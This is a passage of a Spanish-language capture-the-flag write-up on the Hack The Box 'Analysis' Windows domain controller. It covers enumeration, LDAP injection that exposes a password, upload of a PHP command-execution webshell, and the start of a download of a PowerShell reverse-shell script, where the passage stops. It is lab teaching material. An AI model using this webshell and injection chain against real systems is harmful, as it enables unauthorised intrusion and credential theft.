SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20mes
SF:sage<span class="se">\"\x</span>05HY000<span class="s2">")%r(JavaRMI,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(WMSRequ
SF:est,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(oracle-tns,32,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span>%<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x16Invalid\x20message-fram
SF:e\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInv
SF:alid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time:
|   date: 2024-06-06T19:28:53
|_  start_date: N/A
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un <code class="language-plaintext highlighter-rouge">domain controller</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.250
SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>No podemos enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.250 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span>-] analysis.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.250 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
</code></pre></div></div>

<ul>
  <li>Tenemos el puerto <code class="language-plaintext highlighter-rouge">3306/tcp</code> abierto pero no podemos enumerar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap mysql <span class="nt">-h</span> 10.10.11.250
ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.10.14.63'</span> is not allowed to connect to this MySQL server
</code></pre></div></div>

<ul>
  <li>Tenemos un servicio web pero no vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/1.png" />
</p>

<ul>
  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos algo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-i</span> http://10.10.11.250
HTTP/1.1 404 Not Found
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Thu, 06 Jun 2024 19:37:49 GMT
Connection: close
Content-Length: 315

&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"</span><span class="o">&gt;</span>
&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;
&lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">Content</span><span class="o">=</span><span class="s2">"text/html; charset=us-ascii"</span><span class="o">&gt;</span>&lt;/HEAD&gt;
&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.&lt;/p&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
➜  nmap dirsearch <span class="nt">-u</span> http://10.10.11.250
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox------------------

Target: http://10.10.11.250/

<span class="o">[</span>13:38:03] Starting:
<span class="o">[</span>13:38:05] 403 -  312B  - /%2e%2e//google.com
<span class="o">[</span>13:38:06] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>13:38:23] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span>13:38:56] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

Task Completed
</code></pre></div></div>

<ul>
  <li>Al no haber nada vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por subdominios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ffuf <span class="nt">-u</span> http://10.10.11.250 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.analysis.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>


        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.250
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 89ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</span></code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.250 internal.analysis.htb analysis.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
10.10.11.250 internal.analysis.htb analysis.htb
</code></pre></div></div>

<ul>
  <li>Si ponemos el dominio normal vemos que nos carga lo siguiente.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/2.png" />
</p>

<ul>
  <li>Si cargamos el otro subdominio vemos que nos da un código de estado <code class="language-plaintext highlighter-rouge">403</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/3.png" />
</p>

<ul>
  <li>Vamos hacer <strong>Fuzzing</strong> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content dirsearch <span class="nt">-u</span> http://internal.analysis.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox/

Target: http://internal.analysis.htb/

<span class="o">[</span>12:23:22] Starting:
<span class="o">[</span>12:23:23] 403 -  312B  - /%2e%2e//google.com
<span class="o">[</span>12:23:23] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>12:23:43] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span>12:24:17] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>12:24:25] 301 -  174B  - /dashboard  -&gt;  http://internal.analysis.htb/dashboard/
<span class="o">[</span>12:25:44] 301 -  170B  - /users  -&gt;  http://internal.analysis.htb/users/

Task Completed
</code></pre></div></div>

<ul>
  <li>En la ruta <code class="language-plaintext highlighter-rouge">dashboard</code> seguimos sin ver nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/4.png" />
</p>

<ul>
  <li>Al igual que en la ruta <code class="language-plaintext highlighter-rouge">users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/5.png" />
</p>

<ul>
  <li>Podemos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> por rutas con terminación <code class="language-plaintext highlighter-rouge">.php</code> y vemos que algunos tiene código de estado <code class="language-plaintext highlighter-rouge">200</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content feroxbuster <span class="nt">-u</span> http://internal.analysis.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-x</span> php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 💲  Extensions            │ <span class="o">[</span>php]
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
403      GET       29l       93w     1284c http://internal.analysis.htb/
301      GET        2l       10w      170c http://internal.analysis.htb/users <span class="o">=&gt;</span> http://internal.analysis.htb/users/
200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/img/
200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/index.php
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/uploads/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/css/
200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/Index.php
301      GET        2l       10w      170c http://internal.analysis.htb/Users <span class="o">=&gt;</span> http://internal.analysis.htb/Users/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/lib/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/js/
200      GET        1l        2w       17c http://internal.analysis.htb/Users/list.php
302      GET        0l        0w        3c http://internal.analysis.htb/dashboard/logout.php <span class="o">=&gt;</span> ../employees/login.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/css/Sports.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/css/messages.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/HG.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php
200      GET        1l        2w       17c http://internal.analysis.htb/users/List.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/img/ITKnowledgeExchange
301      GET        2l       10w      174c http://internal.analysis.htb/employees <span class="o">=&gt;</span> http://internal.analysis.htb/employees/
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/Login.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/IMG <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/IMG/
301      GET        2l       10w      184c http://internal.analysis.htb/dashboard/lib/chart <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/lib/chart/
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/752
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/uploads/712
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/js/1368.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/uploads/index_19.php
200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/INDEX.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/2005_12.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/johnson.php
404      GET        0l        0w     1259c http://internal.analysis.htb/jeep
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/ur-guest.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/IMG/spotlight.php
200      GET        1l        2w       17c http://internal.analysis.htb/Users/List.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/agencies
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/google_logo.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/chart/F
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/IMG/siteMap.php
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Details.php
404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/DRHM
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Form.php
</code></pre></div></div>

<ul>
  <li>Vemos un panel de login.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/6.png" />
</p>

<ul>
  <li>Aquí ya encontramos algo interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/7.png" />
</p>

<ul>
  <li>Nos esta pidiendo un parámetro también podemos <code class="language-plaintext highlighter-rouge">fuzzear</code> para encontrarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ffuf <span class="nt">-u</span> http://internal.analysis.htb/users/list.php<span class="se">\?</span>FUZZ<span class="se">\=</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt <span class="nt">-ac</span>

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 91ms]
:: Progress: [12334/12334] :: Job [1/1] :: 441 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
</span></code></pre></div></div>

<h2 id="ldap-injection">LDAP Injection</h2>

<ul>
  <li>
    <p>https://book.hacktricks.xyz/v/es/pentesting-web/ldap-injection</p>
  </li>
  <li>
    <p>Vemos <code class="language-plaintext highlighter-rouge">output</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/8.png" />
</p>

<ul>
  <li>Si ponemos un carácter vemos que ya nos devuelve otra cosa.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/9.png" />
</p>

<ul>
  <li>Vemos que hay un apartado que se llama <code class="language-plaintext highlighter-rouge">Username</code> como el puerto de <code class="language-plaintext highlighter-rouge">kerberos</code> esta abierto podemos enumerar usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.10.11.250 <span class="nt">-d</span> analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/07/24 - Ronnie Flathers @ropnop

2024/06/07 12:59:41 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/06/07 12:59:41 <span class="o">&gt;</span>  	10.10.11.250:88

2024/06/07 13:00:43 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 jdoe@analysis.htb
2024/06/07 13:01:35 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ajohnson@analysis.htb
2024/06/07 13:03:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 cwilliams@analysis.htb
2024/06/07 13:04:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 wsmith@analysis.htb
2024/06/07 13:07:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 jangel@analysis.htb
2024/06/07 13:18:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 technician@analysis.htb
</code></pre></div></div>

<ul>
  <li>No podemos obtener el hash de ningún usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> usrs.txt analysis.htb/
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User jdoe doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User ajohnson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User cwilliams doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User wsmith doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User jangel doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User technician doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>Podemos poner <code class="language-plaintext highlighter-rouge">a*</code> que significa empieza por a pero no sabe en que acaba.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/10.png" />
</p>

<ul>
  <li>
    <p>En LDAP existen atributos aquí nos comparten los que son <a href="https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html">https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html</a> en AD vemos que por ejemplo <code class="language-plaintext highlighter-rouge">First Name</code> en <code class="language-plaintext highlighter-rouge">LDAP</code> es <code class="language-plaintext highlighter-rouge">givenName</code>.</p>
  </li>
  <li>
    <p>Con esto podemos saber que se esta aplicando una <code class="language-plaintext highlighter-rouge">LDAP Injection</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/11.png" />
</p>

<ul>
  <li>Podemos combinar atributos en este caso el campo <code class="language-plaintext highlighter-rouge">Last Name</code> corresponde a <code class="language-plaintext highlighter-rouge">sn</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/12.png" />
</p>

<ul>
  <li>
    <p>Con esta <code class="language-plaintext highlighter-rouge">LDAP Injection</code> también podemos enumerar usuarios.</p>
  </li>
  <li>
    <p><a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/analysis/brute2.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/analysis/brute2.py</a></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 brute2.py
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: c
<span class="o">[</span>+] Valid user: amanson
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: e
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: f
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: g
<span class="o">[</span>+] Valid user: jangel
<span class="o">[</span>+] Valid user: badam
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: d
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: h
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: i
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: k
<span class="o">[</span>+] Valid user: lzen
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: n
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: m
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: o
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: p
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: q
<span class="o">[</span>+] Valid user: technician
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: r
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: s
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: u
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: v
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: x
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: w
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: y
<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: z
</code></pre></div></div>

<ul>
  <li>
    <p>Son los mismos usuarios.</p>
  </li>
  <li>
    <p>En el atributo de <code class="language-plaintext highlighter-rouge">description</code> en LDAP se suelen almacenar contraseñas gracias ala persona que compartió su script para hacerlo <code class="language-plaintext highlighter-rouge">in1t</code> <a href="https://obx0x3.tech/whoami/">https://obx0x3.tech/whoami/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>97NTtl<span class="k">*</span>4QP96Bv
</code></pre></div></div>

<ul>
  <li>Las credenciales son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.250 <span class="nt">-u</span> <span class="s1">'technician'</span> <span class="nt">-p</span> <span class="s1">'97NTtl*4QP96Bv'</span>
SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\t</span>echnician:97NTtl<span class="k">*</span>4QP96Bv
</code></pre></div></div>

<ul>
  <li>Si probamos las credenciales en el <code class="language-plaintext highlighter-rouge">login</code> funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/13.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/14.png" />
</p>

<ul>
  <li>Vemos varios <code class="language-plaintext highlighter-rouge">Tickets</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/15.png" />
</p>

<ul>
  <li>Aquí nos deja subir archivos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/16.png" />
</p>

<ul>
  <li>Vamos a subir algún archivo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/17.png" />
</p>

<ul>
  <li>La ruta donde se guardan existe.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/18.png" />
</p>

<ul>
  <li>Si conoces el nombre del recurso en este caso el que subiste vemos que podemos ver.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/19.png" />
</p>

<ul>
  <li>Vamos a subir una <code class="language-plaintext highlighter-rouge">webshell</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>cmd.php
&lt;?php
	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span>  <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/20.png" />
</p>

<h2 id="shell-as-svc_web">Shell as svc_web</h2>

<ul>
  <li>Ahora vamos a ganar acceso <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
<span class="nt">--2024-06-07</span> 14:30:36--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4339 <span class="o">(</span>4.2K<span class="o">)</span> <span class="o">[</span>text/plain]
